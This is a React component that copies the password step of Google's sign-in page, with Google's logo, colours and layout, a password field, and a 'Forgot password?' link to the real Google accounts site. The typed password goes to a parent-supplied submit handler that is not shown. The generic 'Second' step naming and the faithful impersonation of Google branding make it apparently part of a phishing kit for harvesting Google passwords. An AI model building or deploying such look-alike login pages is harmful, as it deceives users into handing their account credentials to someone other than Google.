import React, { useState } from "react";
import { User } from "lucide-react";

interface SecondProps {
  email?: string;
  password: string;
  onBack: () => void;
  onPasswordChange: (e: React.ChangeEvent<HTMLInputElement>) => void;
  onPasswordSubmit: () => void;
}

const Second: React.FC<SecondProps> = ({
  email = "user@example.com",
  password,
  onBack,
  onPasswordChange,
  onPasswordSubmit,
}) => {
  const [showPassword, setShowPassword] = useState(false);

  return (
    <div className="w-full max-w-[448px] bg-white rounded-2xl border border-gray-200 shadow-sm p-10 mx-auto">
      <div className="flex flex-col items-center mb-8">
        <svg
          xmlns="http://www.w3.org/2000/svg"
          width="48"
          height="48"
          viewBox="0 0 48 48"
          className="mb-4"
        >
          <path
            fill="#EA4335"
            d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"
          />
          <path
            fill="#4285F4"
            d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"
          />
          <path
            fill="#FBBC05"
            d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"
          />
          <path
            fill="#34A853"
            d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"
          />
          <path fill="none" d="M0 0h48v48H0z" />
        </svg>
        <h1 className="text-2xl font-medium text-gray-800 mb-2">Welcome</h1>

        <div
          onClick={onBack}
          className="flex items-center gap-2 border border-gray-200 rounded-full px-1.5 py-1 pr-4 mt-2 cursor-pointer hover:bg-gray-50 transition-colors"
        >
          <div className="w-6 h-6 rounded-full bg-purple-600 flex items-center justify-center text-white text-xs overflow-hidden">
            <User size={16} />
          </div>
          <span className="text-sm font-medium text-gray-700">{email}</span>
          <svg
            xmlns="http://www.w3.org/2000/svg"
            width="18"
            height="18"
            viewBox="0 0 24 24"
            fill="none"
            stroke="currentColor"
            strokeWidth="2"
            strokeLinecap="round"
            strokeLinejoin="round"
            className="text-gray-500 ml-auto"
          >
            <path d="m6 9 6 6 6-6" />
          </svg>
        </div>
      </div>

      <div className="flex flex-col space-y-12">
        <div className="relative group">
          <input
            type={showPassword ? "text" : "password"}
            id="password"
            className="block px-3.5 pb-2.5 pt-4 w-full text-base text-gray-900 bg-transparent rounded-md border border-gray-300 appearance-none focus:outline-none focus:ring-0 focus:border-blue-600 peer"
            placeholder=" "
            value={password}
            onChange={onPasswordChange}
          />
          <label
            htmlFor="password"
            className="absolute text-base text-gray-500 duration-300 transform -translate-y-4 scale-75 top-2 z-10 origin-left bg-white px-1 peer-focus:px-1 peer-focus:text-blue-600 peer-placeholder-shown:scale-100 peer-placeholder-shown:-translate-y-1/2 peer-placeholder-shown:top-1/2 peer-focus:top-2 peer-focus:scale-75 peer-focus:-translate-y-4 left-2.5"
          >
            Enter your password
          </label>
        </div>

        <div className="flex items-center -mt-8">
          <input
            type="checkbox"
            id="show-password"
            checked={showPassword}
            onChange={() => setShowPassword(!showPassword)}
            className="w-4 h-4 text-blue-600 border-gray-300 rounded focus:ring-blue-500"
          />
          <label
            htmlFor="show-password"
            className="ml-2 text-sm text-gray-700 cursor-pointer"
          >
            Show password
          </label>
        </div>

        <div className="flex justify-between items-center pt-4">
          <a
            href="https://accounts.google.com/v3/signin/challenge/pk/presend"
            className="text-blue-600 font-medium text-sm hover:bg-blue-50 px-4 py-2 rounded cursor-pointer -ml-4"
          >
            Forgot password?
          </a>
          <button
            onClick={onPasswordSubmit}
            className="bg-[#0b57d0] text-white text-sm font-medium px-6 py-2 rounded-full hover:bg-blue-700 hover:shadow-md transition-all cursor-pointer"
          >
            Next
          </button>
        </div>
      </div>
    </div>
  );
};

export default Second;
